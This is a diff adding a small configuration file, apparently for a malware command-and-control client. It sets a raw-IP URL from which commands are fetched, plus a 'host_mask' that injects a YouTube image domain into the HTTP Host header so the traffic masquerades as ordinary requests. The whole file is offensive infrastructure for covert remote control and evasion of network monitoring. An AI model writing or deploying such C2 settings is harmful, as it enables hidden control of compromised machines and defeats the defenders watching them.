@@ -1,0 +1,5 @@
+# Link to check for C2 command.
+c2_link: http://13.55.12.66/cmd.txt
+# Host to use to mask the communication.
+# This value will be injected in the HTTP `Host` header.
+host_mask: z.ytimg.com
